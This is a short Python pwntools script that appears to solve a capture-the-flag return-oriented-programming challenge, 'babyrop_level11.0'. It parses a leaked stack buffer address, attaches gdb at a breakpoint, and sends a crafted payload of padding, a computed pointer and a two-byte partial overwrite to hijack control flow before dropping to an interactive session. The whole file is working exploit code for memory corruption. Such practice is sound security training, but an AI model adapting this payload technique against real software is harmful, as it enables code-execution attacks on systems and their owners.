from pwn import *
import time 

binary = './babyrop_level11.0'
elf = ELF(binary)

context.binary = binary
p = process(binary)



p.recvuntil(b"Your input buffer is located at: ")
buffer_addr = int(p.recvuntil(b".\n\n", drop=True), 16)
print(f"[+] Input buffer is at: {hex(buffer_addr)}")
win_ptr_addr = buffer_addr - 8 


offset = 0x30  


s = '''
b *challenge+1774
'''
gdb.attach(p, s)


payload = flat(
	b'A'*8,
	b'A'*0x50,
	win_ptr_addr - 8,          
	b'\x1e\x17', 
)

p.send(payload)

p.interactive()
